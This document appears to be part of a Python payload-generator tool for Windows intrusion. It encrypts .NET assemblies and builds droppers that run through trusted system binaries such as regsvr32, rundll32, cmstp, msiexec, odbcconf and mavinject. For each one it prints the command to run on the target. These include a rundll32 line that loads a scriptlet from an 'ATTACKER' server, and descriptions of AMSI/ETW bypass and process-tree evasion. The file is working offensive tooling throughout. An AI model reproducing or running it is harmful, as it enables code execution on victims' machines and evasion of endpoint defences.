        template_file="regsvr32_payload.sct",
        output_file="payload_ready.sct",
    )

    inf_tpl_path = get_template_path(inf_template, None)
    inf_content = load_template(inf_tpl_path)
    inf_content = inf_content.replace("YOURSCTPATHHERE", os.path.basename(sct_path))

    inf_dir = os.path.dirname(sct_path) or "."
    inf_path = os.path.join(inf_dir, inf_output)
    with open(inf_path, "w") as f:
        f.write(inf_content)

    print(f"[+] Written: {inf_path}", file=sys.stderr)
    print(f"[*] On target (both files must be in same directory):", file=sys.stderr)
    print(f"    {execution_cmd.format(inf=os.path.basename(inf_path))}", file=sys.stderr)
    return sct_path, inf_path


def build_cmstp(args, assembly_args):
    _build_sct_inf_pair(
        args, assembly_args,
        inf_template="cmstp_payload.inf",
        inf_output="payload_ready.inf",
        execution_cmd="cmstp.exe /ni /s {inf}",
    )


def build_infdefaultinstall(args, assembly_args):
    _build_sct_inf_pair(
        args, assembly_args,
        inf_template="infdefaultinstall_payload.inf",
        inf_output="payload_ready.inf",
        execution_cmd="InfDefaultInstall.exe {inf}",
    )


def build_rundll32(args, assembly_args):
    output_path = _build_vbs_family(
        args, assembly_args,
        template_file="regsvr32_payload.sct",
        output_file="payload_ready.sct",
    )
    basename = os.path.basename(output_path)
    print(f"[*] On target (local — use full path to .sct):", file=sys.stderr)
    print(f'    rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication '
          f'";GetObject("script:C:\\\\path\\\\{basename}")', file=sys.stderr)
    print(f"[*] On target (remote — host the .sct on your server):", file=sys.stderr)
    print(f'    rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication '
          f'";GetObject("script:http://ATTACKER/{basename}")', file=sys.stderr)


def _native_args(assembly_args):
    if not assembly_args:
        return None
    lines = []
    for i, arg in enumerate(assembly_args):
        escaped = arg.replace("\\", "\\\\").replace('"', '\\"')
        lines.append(f'        {{ long idx = {i}; BSTR b = SysAllocString(L"{escaped}");'
                     f' SafeArrayPutElement(psaArgs, &idx, b); SysFreeString(b); }}')
    return "\n".join(lines)


def _build_native_dll(args, assembly_args, output_file, compile_target):
    assembly_bytes = _read_input(args.assembly, "Assembly")
    template_path = get_template_path("native_dll_payload.cpp", args.template)
    template = load_template(template_path)

    encrypted, key, iv, salt, keying_names = _encrypt(assembly_bytes, args)
    encrypted_b64 = _b64(encrypted)
    key_b64 = _b64(key)
    print(f"[*] Encrypted payload: {len(encrypted_b64)} chars base64", file=sys.stderr)

    if args.encryption == "xor":
        template = remove_block(template, "// DECRYPT_AES_IV", "// DECRYPT_AES_IV_END")
        template = remove_block(template, "// DECRYPT_AES_START", "// DECRYPT_AES_END")
        template = uncomment_csharp_block(template, "// DECRYPT_XOR_START", "// DECRYPT_XOR_END")
        template = uncomment_csharp_block(template, "// DECRYPT_XOR_LOAD_START", "// DECRYPT_XOR_LOAD_END")
        template = inject_placeholders(template, {
            '"YOURPAYLOADHERE"': f'"{encrypted_b64}"',
            '"YOURKEYHERE"': f'"{key_b64}"',
        })
        args_put = _native_args(assembly_args)
        argc = len(assembly_args) if assembly_args else 0
        template = template.replace(
            "// YOURARGS_XOR_START\n"
            "        SAFEARRAYBOUND ab = { 0, 0 };\n"
            "        // YOURARGS_XOR_END",
            f"        SAFEARRAYBOUND ab = {{ {argc}, 0 }};",
        )
        if args_put:
            template = template.replace("        // YOURARGS_XOR_PUT", args_put)
        else:
            template = template.replace("        // YOURARGS_XOR_PUT\n", "")
        template = template.replace("    // YOURARGS_START\n"
                                    "            SAFEARRAYBOUND ab = { 0, 0 };\n"
                                    "            // YOURARGS_END", "")
        template = template.replace("            // YOURARGS_PUT\n", "")
    else:
        template = remove_block(template, "// DECRYPT_XOR_START", "// DECRYPT_XOR_END")
        template = remove_block(template, "// DECRYPT_XOR_LOAD_START", "// DECRYPT_XOR_LOAD_END")
        iv_b64 = _b64(iv)
        template = inject_placeholders(template, {
            '"YOURPAYLOADHERE"': f'"{encrypted_b64}"',
            '"YOURKEYHERE"': f'"{key_b64}"',
            '"YOURIVHERE"': f'"{iv_b64}"',
        })
        args_put = _native_args(assembly_args)
        argc = len(assembly_args) if assembly_args else 0
        template = template.replace(
            "// YOURARGS_START\n"
            "            SAFEARRAYBOUND ab = { 0, 0 };\n"
            "            // YOURARGS_END",
            f"            SAFEARRAYBOUND ab = {{ {argc}, 0 }};",
        )
        if args_put:
            template = template.replace("            // YOURARGS_PUT", args_put)
        else:
            template = template.replace("            // YOURARGS_PUT\n", "")

    output_path = args.output or os.path.join(OUTPUT_DIR, output_file)
    _ensure_output_dir(output_path)
    with open(output_path, "w") as f:
        f.write(template)

    size_kb = os.path.getsize(output_path) / 1024
    print(f"[+] Written: {output_path} ({size_kb:.0f} KB)", file=sys.stderr)

    if getattr(args, "compile", False):
        _compile_native_dll(output_path, compile_target)

    return output_path


def _compile_native_dll(cpp_path, target):
    gpp = shutil.which("x86_64-w64-mingw32-g++")
    if not gpp:
        print("[-] x86_64-w64-mingw32-g++ not found. Install MinGW-w64: brew install mingw-w64",
              file=sys.stderr)
        sys.exit(1)

    ext = ".cpl" if target == "cpl" else ".dll"
    dll_path = os.path.splitext(cpp_path)[0] + ext
    cmd = (f"x86_64-w64-mingw32-g++ -shared -o {dll_path} {cpp_path} "
           f"-loleaut32 -lole32 -static-libgcc -static-libstdc++ -s")
    print(f"[*] Compiling: {cmd}", file=sys.stderr)
    ret = os.system(cmd)
    if ret == 0:
        size_kb = os.path.getsize(dll_path) / 1024
        print(f"[+] Compiled: {dll_path} ({size_kb:.0f} KB)", file=sys.stderr)
    else:
        print(f"[-] Compilation failed (exit code {ret})", file=sys.stderr)
        sys.exit(1)


def build_control(args, assembly_args):
    output_path = _build_native_dll(args, assembly_args, "payload_ready.cpp", "cpl")
    cpl_name = os.path.basename(output_path).replace(".cpp", ".cpl")
    print(f"[*] On target:", file=sys.stderr)
    print(f"    control.exe {cpl_name}", file=sys.stderr)
    if not getattr(args, "compile", False):
        print(f"[*] Compile with:", file=sys.stderr)
        print(f"    x86_64-w64-mingw32-g++ -shared -o {cpl_name} "
              f"{os.path.basename(output_path)} -loleaut32 -lole32 -static-libgcc "
              f"-static-libstdc++ -s", file=sys.stderr)


def build_msiexec(args, assembly_args):
    output_path = _build_native_dll(args, assembly_args, "payload_ready.cpp", "dll")
    dll_name = os.path.basename(output_path).replace(".cpp", ".dll")
    print(f"[*] On target:", file=sys.stderr)
    print(f"    msiexec /y {dll_name}", file=sys.stderr)
    if not getattr(args, "compile", False):
        print(f"[*] Compile with:", file=sys.stderr)
        print(f"    x86_64-w64-mingw32-g++ -shared -o {dll_name} "
              f"{os.path.basename(output_path)} -loleaut32 -lole32 -static-libgcc "
              f"-static-libstdc++ -s", file=sys.stderr)


def build_odbcconf(args, assembly_args):
    output_path = _build_native_dll(args, assembly_args, "payload_ready.cpp", "dll")
    dll_name = os.path.basename(output_path).replace(".cpp", ".dll")
    print(f"[*] On target:", file=sys.stderr)
    print(f"    odbcconf /a {{REGSVR {dll_name}}}", file=sys.stderr)
    print(f"    odbcconf /f response.rsp  (with REGSVR {dll_name} in file)", file=sys.stderr)
    if not getattr(args, "compile", False):
        print(f"[*] Compile with:", file=sys.stderr)
        print(f"    x86_64-w64-mingw32-g++ -shared -o {dll_name} "
              f"{os.path.basename(output_path)} -loleaut32 -lole32 -static-libgcc "
              f"-static-libstdc++ -s", file=sys.stderr)


def build_mavinject(args, assembly_args):
    output_path = _build_native_dll(args, assembly_args, "payload_ready.cpp", "dll")

    # Uncomment DllMain execute block so payload fires on injection
    with open(output_path, "r") as f:
        content = f.read()
    content = uncomment_csharp_block(content, "// DLLMAIN_EXECUTE_START", "// DLLMAIN_EXECUTE_END")
    with open(output_path, "w") as f:
        f.write(content)

    dll_name = os.path.basename(output_path).replace(".cpp", ".dll")
    print(f"[*] On target:", file=sys.stderr)
    print(f"    mavinject <PID> /INJECTRUNNING {dll_name}", file=sys.stderr)
    print(f"[*] Find a target PID:", file=sys.stderr)
    print(f"    tasklist /fi \"username eq %USERNAME%\"", file=sys.stderr)
    if not getattr(args, "compile", False):
        print(f"[*] Compile with:", file=sys.stderr)
        print(f"    x86_64-w64-mingw32-g++ -shared -o {dll_name} "
              f"{os.path.basename(output_path)} -loleaut32 -lole32 -static-libgcc "
              f"-static-libstdc++ -s", file=sys.stderr)


def build_te(args, assembly_args):
    output_path = _build_native_dll(args, assembly_args, "payload_ready.cpp", "dll")

    with open(output_path, "r") as f:
        content = f.read()
    content = uncomment_csharp_block(content, "// DLLMAIN_EXECUTE_START", "// DLLMAIN_EXECUTE_END")
    with open(output_path, "w") as f:
        f.write(content)

    dll_name = os.path.basename(output_path).replace(".cpp", ".dll")
    print(f"[*] On target (requires WDK/ADK te.exe):", file=sys.stderr)
    print(f"    te.exe {dll_name}", file=sys.stderr)
    print(f"[*] Common te.exe paths:", file=sys.stderr)
    print(f"    C:\\Program Files (x86)\\Windows Kits\\10\\Testing\\Runtimes\\TAEF\\x64\\te.exe", file=sys.stderr)
    if not getattr(args, "compile", False):
        print(f"[*] Compile with:", file=sys.stderr)
        print(f"    x86_64-w64-mingw32-g++ -shared -o {dll_name} "
              f"{os.path.basename(output_path)} -loleaut32 -lole32 -static-libgcc "
              f"-static-libstdc++ -s", file=sys.stderr)


def build_pcalua(args, assembly_args):
    output_path = _build_vbs_family(
        args, assembly_args,
        template_file="vbscript_payload.vbs",
        output_file="payload_ready.vbs",
    )
    vbs_name = os.path.basename(output_path)
    print(f"[*] On target:", file=sys.stderr)
    print(f"    pcalua -a C:\\Windows\\System32\\cscript.exe -c {vbs_name}", file=sys.stderr)
    print(f"[*] Alternate (via mshta — rebuild with 'hta' type):", file=sys.stderr)
    print(f"    pcalua -a C:\\Windows\\System32\\mshta.exe -c payload.hta", file=sys.stderr)


def build_certutil(args, assembly_args):
    input_data = _read_input(args.assembly, "Input file")
    b64_data = base64.b64encode(input_data).decode()
    lines = [b64_data[i:i+64] for i in range(0, len(b64_data), 64)]
    encoded = "-----BEGIN CERTIFICATE-----\n"
    encoded += "\n".join(lines) + "\n"
    encoded += "-----END CERTIFICATE-----\n"

    output_path = args.output or os.path.join(OUTPUT_DIR, "encoded.b64")
    _ensure_output_dir(output_path)
    with open(output_path, "w") as f:
        f.write(encoded)

    size_kb = os.path.getsize(output_path) / 1024
    orig_name = os.path.basename(args.assembly)
    out_name = os.path.basename(output_path)
    print(f"[+] Written: {output_path} ({size_kb:.0f} KB)", file=sys.stderr)
    print(f"[*] On target:", file=sys.stderr)
    print(f"    certutil -decode {out_name} {orig_name}", file=sys.stderr)
    print(f"[*] Alternative (echo + decode):", file=sys.stderr)
    print(f"    certutil -decode C:\\Windows\\Temp\\{out_name} C:\\Windows\\Temp\\{orig_name}", file=sys.stderr)


PAYLOAD_BUILDERS = {
    "msbuild": build_msbuild,
    "installutil": build_installutil,
    "workflow": build_workflow,
    "regasm": build_regasm,
    "regsvcs": build_regsvcs,
    "csc": build_csc,
    "powershell": build_powershell,
    "vbscript": build_vbscript,
    "hta": build_hta,
    "vba": build_vba,
    "shellcode": build_shellcode,
    "regsvr32": build_regsvr32,
    "wmic": build_wmic,
    "cmstp": build_cmstp,
    "rundll32": build_rundll32,
    "infdefaultinstall": build_infdefaultinstall,
    "syncappvpub": build_syncappvpub,
    "csi": build_csi,
    "control": build_control,
    "msiexec": build_msiexec,
    "odbcconf": build_odbcconf,
    "mavinject": build_mavinject,
    "certutil": build_certutil,
    "pcalua": build_pcalua,
    "te": build_te,
}

PAYLOAD_DESCRIPTIONS = {
    "msbuild": "MSBuild inline task (.csproj) — trusted binary, no compilation needed",
    "installutil": "InstallUtil custom action (.cs) — runs via /U uninstall handler",
    "workflow": "Workflow Compiler (.cs + .xoml + .xml) — Microsoft.Workflow.Compiler.exe",
    "regasm": "RegAsm unregister handler (.cs) — C:\\Windows\\..\\RegAsm.exe /U",
    "regsvcs": "RegSvcs COM+ registration (.cs) — requires strong naming",
    "csc": "csc.exe inline compile+run (.cs) — compile and execute in one step",
    "powershell": "PowerShell cradle (.ps1) — AMSI/ETW bypass, in-memory load",
    "vbscript": "VBScript CLR bootstrap (.vbs) — cscript execution",
    "hta": "HTA application (.hta) — mshta execution, browser context",
    "vba": "VBA macro (.bas) — Excel/Word Auto_Open, CLR via COM",
    "shellcode": "VBA shellcode runner (.bas) — raw shellcode, no CLR needed",
    "regsvr32": "Regsvr32 scriptlet (.sct) — squiblydoo, local or remote execution",
    "wmic": "WMIC XSL transform (.xsl) — embedded VBScript, local or remote",
    "cmstp": "CMSTP profile installer (.inf + .sct) — scriptlet via INF",
    "rundll32": "Rundll32 scriptlet (.sct) — JavaScript + GetObject execution",
    "infdefaultinstall": "InfDefaultInstall (.inf + .sct) — lesser-known INF handler",
    "syncappvpub": "SyncAppvPublishingServer (.ps1) — alt PowerShell host, different process tree",
    "csi": "C# Interactive (.csx) — csi.exe script, no compilation needed",
    "control": "Control panel applet (.cpl) — control.exe loads native DLL",
    "msiexec": "MSI DLL registration (.dll) — msiexec /y DllRegisterServer",
    "odbcconf": "ODBC config DLL load (.dll) — odbcconf /a {REGSVR} DllRegisterServer",
    "mavinject": "DLL injection (.dll) — mavinject PID /INJECTRUNNING, fires via DllMain",
    "certutil": "Certutil encode (.b64) — encode any file for certutil -decode transfer",
    "pcalua": "PcaLua proxy (.vbs) — VBScript via Program Compatibility Assistant, alternate parent process",
    "te": "TAEF test loader (.dll) — te.exe loads DLL, fires via DllMain (requires WDK/ADK)",
}
